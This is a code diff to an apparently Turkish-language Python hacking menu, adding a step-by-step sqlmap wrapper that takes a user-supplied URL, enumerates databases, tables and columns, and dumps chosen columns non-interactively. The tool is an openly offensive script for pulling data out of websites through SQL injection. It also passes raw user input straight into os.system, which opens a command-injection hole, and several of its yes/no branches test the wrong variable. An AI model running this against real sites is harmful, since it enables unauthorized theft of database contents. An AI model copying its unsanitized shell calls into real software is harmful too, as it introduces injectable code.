@@ -147,7 +147,39 @@ def main_menu():
     elif giris == "2":
         print("SQLMAP (İNJECTİON) SEÇTİN:D")
         linkk = input("Link: ")
-        os.system("sqlmap -u " + linkk + " --dbs")
+        os.system("sqlmap -u " + linkk + " --dbs --batch")
+        
+        devamsoru = input("Devam Etmek İstermisiniz? (Y/n): ")
+        
+        if devamsoru == "Y" or devamsoru == "y":
+            dbnamesoru = input("Database ismini giriniz: ")
+            os.system("sqlmap -u " + linkk + " -D " + dbnamesoru + " --tables --batch")
+            
+            devamsoru2 = input("Devam Etmek İstermisiniz? (Y/n): ")
+            
+            if devamsoru2 == "Y" or devamsoru == "y":
+                tablenamesoru = input("Tablename Giriniz: ")
+                os.system("sqlmap -u " + linkk + " -D " + dbnamesoru + " -T " + tablenamesoru + " --columns --batch")
+                
+                devamsoru3 = input("Devam Etmek İstermisiniz? (Y/n): ")
+                
+                if devamsoru3 == "Y" or devamsoru == "y":
+                    columnnotcolored = colored("""Not: Birden fazla column çekmek istiyorsanız virgül ile boşluksuz yazabilirsiniz.
+Örn: column1,column2,column3
+""", "red")
+                    print(columnnotcolored)
+                    columnnamesoru = input("Column name Giriniz: ")
+                    os.system("sqlmap -u " + linkk + " -D " + dbnamesoru + " -T " + tablenamesoru + " -C " + columnnamesoru + " --dump --batch")
+                    
+                elif devamsoru3 == "N" or devamsoru == "n":
+                    main_menu()
+        
+            elif devamsoru2 == "N" or devamsoru == "n":
+                main_menu()
+        
+        elif devamsoru == "N" or devamsoru == "n":
+            main_menu()
+        
         gecis_soru = input("Restart? (Y/n): ")
         if gecis_soru == "Y" or gecis_soru == "y":
             main_menu()
